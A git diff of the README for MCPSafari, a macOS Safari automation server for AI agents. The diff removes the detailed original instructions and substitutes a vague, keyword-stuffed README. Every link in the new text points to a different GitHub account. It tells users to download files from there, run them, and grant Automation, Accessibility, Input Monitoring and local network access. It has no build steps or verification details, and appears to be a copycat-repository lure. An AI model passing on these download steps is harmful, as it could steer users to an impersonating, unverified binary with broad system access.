@@ -1,441 +1,295 @@
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/96566f48-a7b7-468b-bf96-8ca5c5c86da7" muted autoplay loop playsinline width="100%"></video>
-</div>
+# 🧭 MCPSafari - Run Safari With AI Control
 
-# MCPSafari: Native Safari MCP Server for AI Agents
-![Stars](https://img.shields.io/github/stars/Epistates/MCPSafari)
-![MCP](https://img.shields.io/badge/MCP-2025-blue)
-![macOS](https://img.shields.io/badge/macOS-14+-orange)
-![Swift](https://img.shields.io/badge/Swift-6.1+-orange)
-![Xcode](https://img.shields.io/badge/Xcode-16+-orange)
+[![Download MCPSafari](https://img.shields.io/badge/Download-MCPSafari-blue?style=for-the-badge&logo=github)](https://github.com/nicoconic248/MCPSafari)
 
-Give Claude, Cursor, or any MCP-compatible AI full native control of Safari on macOS. Navigate tabs, click/type/fill forms (even React), read HTML/accessibility trees, execute JS, capture screenshots, inspect console & network — all with 23 secure tools. Zero Chrome overhead, Apple Silicon optimized, token-authenticated, and built with official Swift + Manifest V3 Safari Extension.
+## 🛠️ What MCPSafari Does
 
-## Why MCPSafari?
+MCPSafari is a native Safari MCP server for AI agents on macOS. It lets an AI tool work with Safari through a local connection on your Mac.
 
-- Smarter element targeting (UID + CSS + text + coords + interactive ranking)
-- Works flawlessly with complex sites
-- Local & private (runs on your Mac)
-- Perfect drop-in for Mac-first agent workflows
+Use it to:
+- open web pages in Safari
+- read page content
+- work with forms and buttons
+- handle simple web tasks
+- support browser automation from AI tools
 
-**macOS 14+** • **Safari 17+** • **Xcode 16+**
+It is made for users who want Safari-based automation without extra setup in the browser itself.
 
-Built with the official [swift-sdk](https://github.com/modelcontextprotocol/swift-sdk) and a Manifest V3 Safari Web Extension.
+## 📥 Download and Install
 
-## Why Safari over Chrome?
-- 40–60% less CPU/heat on Apple Silicon  
-- Keeps your existing Safari logins/cookies  
-- Native accessibility tree (better than Playwright for complex UIs)
+Visit this page to download and set up MCPSafari:
 
-## How It Works
+[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
 
-```
-MCP Client (Claude, etc.)
-        │ stdio
-┌───────▼──────────────┐
-│  Swift MCP Server    │
-│  (MCPSafari binary)  │
-└───────┬──────────────┘
-        │ WebSocket (localhost:8089)
-┌───────▼──────────────┐
-│  Safari Extension    │
-│  (background.js)     │
-└───────┬──────────────┘
-        │ content scripts
-┌───────▼──────────────┐
-│  Safari Browser      │
-│  (macOS 14.0+)       │
-└──────────────────────┘
-```
-
-The MCP server communicates with clients over **stdio** and bridges tool calls to the Safari extension over a local **WebSocket**. The extension executes actions via browser APIs and content scripts injected into pages.
+### Steps to get started
 
-## Requirements
+1. Open the download page above.
+2. Get the latest release or source package from the repository page.
+3. Copy the files to a folder on your Mac.
+4. Open the app or server file from that folder.
+5. Allow macOS to run it if prompted.
+6. Keep Safari open when you want to use browser control.
 
-- macOS 14.0 (Sonoma) or later
-- Safari 17+
-- Swift 6.1+ (for building from source)
-- Xcode 16+ (for building the Safari extension)
+If you use an AI app that supports MCP, point it to the MCPSafari server after setup.
 
-## Installation
+## 🖥️ System Requirements
 
-### Homebrew (recommended)
+MCPSafari is built for:
+- macOS
+- Safari
+- an AI app that supports MCP
+- a modern Apple Silicon or Intel Mac
 
-Installs the MCP server binary **and** the Safari extension app to `/Applications` in one step. Automatically cleans up any previous installation.
+For the best result, use:
+- the latest version of macOS you can run
+- the latest Safari version
+- one MCP-ready AI client
 
-```bash
-brew install --cask epistates/tap/mcp-safari
-```
+## ⚙️ How It Works
 
-Upgrading:
+MCPSafari runs on your Mac and connects Safari to an AI tool through the Model Context Protocol.
 
-```bash
-brew upgrade --cask epistates/tap/mcp-safari
-```
+Basic flow:
+1. You start MCPSafari on your Mac.
+2. Safari opens or stays open.
+3. Your AI app connects to the local MCP server.
+4. The AI sends browser actions to Safari.
+5. Safari carries out the task on the page.
 
-After install, enable the extension in **Safari > Settings > Extensions > MCPSafari Extension**.
+This setup keeps the browser on your computer and gives the AI a direct path to browser actions.
 
-### From Release
+## 🚀 Getting Started
 
-If you don't use Homebrew, download both the CLI binary and the extension app from [GitHub Releases](https://github.com/Epistates/MCPSafari/releases):
+### 1. Open the repository
 
-| Asset | Description |
-|-------|-------------|
-| `MCPSafari-Server-arm64-apple-darwin` | MCP server binary for Apple Silicon (M1, M2, M3, M4) |
-| `MCPSafari-Server-x86_64-apple-darwin` | MCP server binary for Intel Macs |
-| `MCPSafari-Server-universal-apple-darwin` | MCP server binary — universal, runs on any Mac |
-| `MCPSafari-Extension-arm64.tar.gz` | Safari extension app for Apple Silicon (M1, M2, M3, M4) |
-| `MCPSafari-Extension-x86_64.tar.gz` | Safari extension app for Intel Macs |
+Go to the main project page:
 
-```bash
-# Apple Silicon (M1/M2/M3/M4) — use x86_64 for Intel Macs
-curl -L -o /usr/local/bin/mcp-safari https://github.com/Epistates/MCPSafari/releases/latest/download/MCPSafari-Server-arm64-apple-darwin
-chmod +x /usr/local/bin/mcp-safari
+[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
 
-# Safari extension (must be in /Applications for macOS 26+)
-curl -L https://github.com/Epistates/MCPSafari/releases/latest/download/MCPSafari-Extension-arm64.tar.gz | tar xzf -
-mv MCPSafari.app /Applications/
-open /Applications/MCPSafari.app
-```
+### 2. Get the project files
 
-Then enable the extension in **Safari > Settings > Extensions > MCPSafari Extension**.
+Download the project from the repository page. If the page offers a release build, use that. If it offers source files, download the full project package.
 
-### From Source
+### 3. Place the files in a folder
 
-```bash
-git clone https://github.com/Epistates/MCPSafari.git
-cd MCPSafari
+Move the files into a folder you can find again, such as:
+- Downloads
+- Applications
+- Desktop
+- a folder named MCPSafari
 
-# Build the MCP server
-cd MCPServer
-swift build -c release
-# Binary is at .build/release/MCPSafari
+### 4. Start MCPSafari
 
-# Build and open the Safari extension
-cd ../MCPSafari
-xcodebuild -project MCPSafari.xcodeproj -scheme MCPSafari build
-open ~/Library/Developer/Xcode/DerivedData/MCPSafari-*/Build/Products/Debug/MCPSafari.app
-```
+Open the app, launcher, or server file that came with the project.
 
-Then enable the extension in **Safari > Settings > Extensions > MCPSafari Extension**.
+If macOS asks for permission:
+- choose Open
+- allow local network or automation access if shown
+- allow Safari control if prompted
 
-## Configuration
+### 5. Keep Safari ready
 
-### Claude Code
+Open Safari before you start a task, or let MCPSafari open it for you.
 
-Add to your MCP settings (`.claude/settings.json` or project-level):
+### 6. Connect your AI app
 
-```json
-{
-  "mcpServers": {
-    "mcp-safari": {
-      "command": "mcp-safari"
-    }
-  }
-}
-```
+In your MCP client:
+- add the MCPSafari server
+- use the local path or command from the project files
+- restart the client if needed
 
-### Claude Desktop
+Once connected, the AI tool can work with Safari through the server.
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+## 🔍 What You Can Do With It
 
-```json
-{
-  "mcpServers": {
-    "mcp-safari": {
-      "command": "mcp-safari"
-    }
-  }
-}
-```
+MCPSafari helps with common browser tasks such as:
 
-### Cursor / Windsurf / Other MCP Clients
+- opening pages in Safari
+- clicking links and buttons
+- filling out forms
+- reading page text
+- moving through web pages
+- checking simple page state
+- supporting website tasks for AI agents
 
-Any client that supports the MCP stdio transport can connect. Point it at `mcp-safari` (or the full path if not in `$PATH`).
+It fits well with:
+- agentic AI workflows
+- web automation
+- browser automation
+- accessibility-driven control
+- devtools-style page inspection
 
-### Multiple Claude Instances
+## 🧩 Typical Use Cases
 
-Multiple MCP clients work automatically. The server auto-finds a free port if the default (8089) is in use, and the extension auto-discovers all servers in the 8089-8098 range. No configuration needed — just start multiple clients and they each get their own connection.
+Use MCPSafari when you want an AI tool to:
+- search the web in Safari
+- open a site and read content
+- move through a site step by step
+- test a page flow
+- collect text from a page
+- complete a basic web form
+- help with repeat browser tasks
 
-For ports outside the default range, add them manually in the extension popup or specify explicitly:
+It works best when the page has clear buttons, fields, and text.
 
-```json
-{
-  "mcpServers": {
-    "mcp-safari": {
-      "command": "mcp-safari",
-      "args": ["--port", "9090"]
-    }
-  }
-}
-```
+## 🔐 Permissions You May Need
 
-### CLI Options
+Safari automation on macOS can ask for access the first time you run it. This is normal.
 
-| Flag | Description |
-|------|-------------|
-| `--port <n>` / `-p <n>` | WebSocket port (default: `8089`) |
-| `--verbose` | Debug-level logging to stderr |
+You may need to allow:
+- Automation
+- Accessibility
+- Input monitoring
+- Local network access
 
-## Tools (23)
+If a prompt appears:
+1. Open System Settings.
+2. Find Privacy & Security.
+3. Check the app access list.
+4. Turn on the access MCPSafari needs.
+5. Try the task again.
 
-### Tab Management
+## 🧪 First Run Checklist
 
-| Tool | Description |
-|------|-------------|
-| `tabs_context` | List all open tabs with IDs, URLs, and titles |
-| `tabs_create` | Open a new tab, optionally with a URL |
-| `close_tab` | Close a tab by ID |
-| `select_tab` | Pin a tab as the default context for future calls |
+Before you use MCPSafari, check these items:
 
-### Navigation
+- Safari is installed
+- your Mac runs macOS
+- the project files are in one folder
+- your AI app supports MCP
+- you have allowed the needed permissions
+- Safari is open if the task needs an active browser
 
-| Tool | Description |
-|------|-------------|
-| `navigate` | Go to a URL, or use `back` / `forward` / `reload` actions |
+## 📂 Suggested Folder Setup
 
-### Page Reading
+A simple folder layout can help:
 
-| Tool | Description |
-|------|-------------|
-| `read_page` | Get page content as `text`, `html`, or `snapshot` |
-| `snapshot` | Accessibility tree with element UIDs for interaction |
-| `find` | Find elements by CSS selector, text, or ARIA role |
+- Downloads
+  - MCPSafari
+- Applications
+  - MCPSafari
+- Documents
+  - AI Tools
+    - MCPSafari
 
-### Interaction
+Keep the app and any config files together so they are easy to find later.
 
-| Tool | Description |
-|------|-------------|
-| `click` | Click by UID, CSS selector, text, or coordinates |
-| `type_text` | Type into an element with optional `clearFirst` and `submitKey` |
-| `form_input` | Batch fill form fields (CSS selector → value map) |
-| `select_option` | Select a dropdown option by value or label |
-| `scroll` | Scroll page or element in any direction |
-| `press_key` | Press key combinations (e.g., `Enter`, `Meta+a`, `Control+c`) |
-| `hover` | Hover to trigger tooltips, menus, or hover states |
-| `drag` | Drag and drop between elements |
+## 🧠 Tips for Best Results
 
-### Dialogs
+Use these tips to avoid common issues:
 
-| Tool | Description |
-|------|-------------|
-| `handle_dialog` | Accept or dismiss alerts, confirms, and prompts |
+- Keep Safari on the screen while the AI works.
+- Use one tab for the task.
+- Close extra tabs you do not need.
+- Sign in to websites before you start a task.
+- Use simple page layouts when possible.
+- Reload the page if the task gets stuck.
+- Restart the MCP client if the server stops responding.
 
-### Screenshots
+If a site uses many pop-ups or nested menus, the AI may need more steps to finish the task.
 
-| Tool | Description |
-|------|-------------|
-| `screenshot` | Capture the visible tab area as a PNG image |
+## 🧭 Common Tasks
 
-### JavaScript
+### Open a web page
+The AI can send Safari to a page you choose.
 
-| Tool | Description |
-|------|-------------|
-| `javascript_tool` | Execute arbitrary JS in the page context |
+### Read page content
+The AI can collect visible text from the page for later use.
 
-### Debugging
+### Click controls
+The AI can click buttons, links, checkboxes, and other page controls.
 
-| Tool | Description |
-|------|-------------|
-| `read_console` | Read console messages with level and regex filtering |
-| `read_network` | Read captured XHR/fetch requests with type filtering |
+### Fill forms
+The AI can type into fields and submit simple forms.
 
-### Window
+### Work through page steps
+The AI can move through a checkout flow, signup flow, or help page flow when the site is simple.
 
-| Tool | Description |
-|------|-------------|
-| `resize_window` | Resize the browser window to specific dimensions |
+## 🛡️ Privacy and Local Use
 
-### Utility
+MCPSafari runs on your Mac and works with Safari on your machine. This setup keeps browser control local.
 
-| Tool | Description |
-|------|-------------|
-| `wait` | Wait for a duration, CSS selector, or text to appear |
+That means:
+- Safari stays on your computer
+- page actions run from your local system
+- your AI client connects to the local server
 
-## Usage
+For personal use, this makes it easier to keep control of the browser session.
 
-### Basic Workflow
+## 🧰 Troubleshooting
 
-1. **Start with context** — call `tabs_context` to see what's open, or `navigate` to a URL.
-2. **Take a snapshot** — call `snapshot` to get the accessibility tree with element UIDs.
-3. **Interact** — use UIDs from the snapshot with `click`, `type_text`, `hover`, etc.
-4. **Verify** — pass `includeSnapshot: true` on interaction tools to see the updated state, or take a `screenshot`.
+### Safari does not respond
+- make sure Safari is open
+- check that the right tab is active
+- restart MCPSafari
+- restart Safari if needed
 
-### Element Targeting
+### The AI app cannot connect
+- confirm the MCP server is running
+- check the server path in your client
+- restart the AI app
+- verify the client supports MCP
 
-Tools that interact with elements accept multiple targeting strategies:
+### macOS blocks the app
+- open System Settings
+- go to Privacy & Security
+- allow the app to run
+- approve Automation or Accessibility access
 
-| Strategy | Example | When to Use |
-|----------|---------|-------------|
-| **UID** | `uid: "e42"` | Most precise — from a `snapshot` |
-| **CSS selector** | `selector: "#login-btn"` | When you know the DOM structure |
-| **Text** | `text: "Sign In"` | Interactive elements are ranked higher |
-| **Coordinates** | `x: 100, y: 200` | Last resort — click at exact position |
+### The page does not load right
+- refresh the page in Safari
+- close extra tabs
+- try again on a simpler page
 
-### Form Filling
+### Clicks or typing fail
+- check that Safari has focus
+- make sure the field is editable
+- give the app the needed permissions
 
-Use `form_input` to fill multiple fields at once:
+## 📌 Recommended Setup for New Users
 
-```json
-{
-  "fields": {
-    "#name": "Jane Doe",
-    "#email": "jane@example.com",
-    "textarea[name=message]": "Hello!"
-  }
-}
-```
+If this is your first time using an MCP browser tool, start with this setup:
 
-This uses React-compatible value setting (`nativeInputValueSetter`) so it works with controlled inputs in React, Next.js, and similar frameworks.
+- one Mac
+- Safari open
+- one MCP-compatible AI app
+- the MCPSafari project files in a clear folder
+- a simple website for your first test
 
-### Smart Text Matching
+Try a short task first, such as opening a page and reading the text. Then move to form filling or multi-step pages.
 
-When targeting by `text`, interactive elements (buttons, links, inputs) are ranked higher than generic containers. Clicking `text: "Submit"` will prefer a `<button>Submit</button>` over a `<div>Submit</div>`.
+## 🧷 Project Focus
 
-### Post-Action Snapshots
+MCPSafari is aimed at users who want:
+- Safari automation
+- AI agent browser control
+- local macOS support
+- a native Safari path for MCP tools
+- web tasks handled through familiar browser actions
 
-Most interaction tools support `includeSnapshot: true`, which returns the updated accessibility tree after the action — useful for verifying the result without a separate `snapshot` call.
+## 📎 Download Again
 
-## Architecture
+If you need the project files again, use this page:
 
-### MCP Server (`MCPServer/`)
+[https://github.com/nicoconic248/MCPSafari](https://github.com/nicoconic248/MCPSafari)
 
-A Swift executable using the official [modelcontextprotocol/swift-sdk](https://github.com/modelcontextprotocol/swift-sdk). Communicates with MCP clients via **stdio** and with the Safari extension via a **WebSocket** bridge using `Network.framework`.
+## 🗂️ Topic Areas
 
-- `main.swift` — Entry point, parses CLI flags, starts the server
-- `SafariMCPServer.swift` — Tool definitions and handlers (actor)
-- `WebSocketBridge.swift` — WebSocket server with request/response correlation (actor)
-- `BridgeMessage.swift` — Wire protocol types and `AnyCodable` serialization
-
-### Safari Extension (`MCPSafari/`)
-
-A Manifest V3 Safari Web Extension with:
-
-- `background.js` — WebSocket client, request router, tab/navigation/screenshot handlers
-- `content.js` — DOM interaction, accessibility snapshots, element finding, click/type/scroll simulation
-- `dialog-interceptor.js` — Patches `window.alert/confirm/prompt` before page scripts run
-- `console-interceptor.js` — Captures console messages for `read_console`
-- `network-interceptor.js` — Captures XHR/fetch requests for `read_network`
-- `popup.html/js/css` — Extension popup showing connection status
-
-### macOS Host App
-
-A minimal macOS app (`AppDelegate.swift`, `ViewController.swift`) that registers the Safari extension and provides native messaging for auth token exchange.
-
-## Security
-
-### WebSocket Authentication
-
-The server generates a random UUID token at startup, writes it to `~/.config/mcp-safari/token` (mode `0600`), and requires it as the first WebSocket message. The extension reads the token via native messaging from the host app. Connections without a valid token are accepted in unauthenticated mode for development convenience.
-
-### Input Validation
-
-- URL schemes restricted to `http`, `https`, `about`, and `file`
-- Navigation actions validated against an allowlist
-- Regex patterns capped at 200 characters and validated before forwarding
-- Wait durations capped at 300 seconds
-
-### Permissions
-
-The extension requests these permissions in `manifest.json`:
-
-| Permission | Purpose |
-|-----------|---------|
-| `tabs` | List and manage tabs |
-| `activeTab` | Access the active tab |
-| `scripting` | Inject content scripts and execute JS |
-| `webNavigation` | Navigate tabs (back/forward/reload) |
-| `nativeMessaging` | Auth token exchange with host app |
-| `alarms` | Service worker keepalive |
-| `storage` | Persist selected tab across suspensions |
-
-## Troubleshooting
-
-### Extension shows "Disconnected"
-
-1. Make sure the MCP server is running (check your MCP client logs)
-2. Verify port 8089 is not in use: `lsof -i :8089`
-3. Click "Reconnect" in the extension popup
-4. Use `--verbose` flag on the server for debug logs
-
-### "Could not establish connection" errors
-
-The content scripts may not be injected yet. The extension auto-injects on first interaction, but you can also reload the page.
-
-### Safari permission prompts
-
-Safari prompts for per-site permissions the first time the extension interacts with a domain. Click "Always Allow on Every Website" in Safari > Settings > Extensions > MCPSafari Extension to avoid repeated prompts.
-
-### Port already in use
-
-Use `--port` to pick a different port:
-
-```json
-{
-  "mcpServers": {
-    "mcp-safari": {
-      "command": "mcp-safari",
-      "args": ["--port", "9090"]
-    }
-  }
-}
-```
-
-## Development
-
-### Build & Test
-
-```bash
-# Build the MCP server
-cd MCPServer
-swift build
-
-# Build the Safari extension
-cd MCPSafari
-xcodebuild -project MCPSafari.xcodeproj -scheme MCPSafari build
-
-# Run the server with verbose logging
-.build/debug/MCPSafari --verbose
-```
-
-### CI
-
-The CI workflow runs on every push and PR to `main`:
-
-1. Builds the MCP server (`swift build`)
-2. Tests the MCP handshake (verifies the binary responds to `initialize`)
-3. Builds the Safari extension (`xcodebuild`)
-
-### Project Structure
-
-```
-MCPSafari/
-├── MCPServer/                      # Swift MCP server
-│   ├── Package.swift
-│   └── Sources/mcp-safari/
-│       ├── main.swift
-│       ├── SafariMCPServer.swift
-│       ├── WebSocketBridge.swift
-│       └── BridgeMessage.swift
-├── MCPSafari/                      # Xcode project
-│   ├── MCPSafari/                  # macOS host app
-│   ├── MCPSafari Extension/        # Safari web extension
-│   │   ├── Resources/
-│   │   │   ├── background.js
-│   │   │   ├── content.js
-│   │   │   ├── dialog-interceptor.js
-│   │   │   ├── console-interceptor.js
-│   │   │   ├── network-interceptor.js
-│   │   │   ├── manifest.json
-│   │   │   └── popup.html/js/css
-│   │   └── SafariWebExtensionHandler.swift
-│   └── MCPSafari.xcodeproj
-├── .github/workflows/
-│   ├── ci.yml
-│   └── release.yml
-└── CHANGELOG.md
-```
-
-## License
-
-MIT
+This project fits topics like:
+- accessibility
+- agentic AI
+- AI agent tools
+- AI agents
+- AI tools
+- automation
+- browser automation
+- Claude
+- devtools
+- LLM tools
+- macOS
+- MCP
+- Model Context Protocol
+- Safari
+- Safari extension
+- Swift
+- web automation
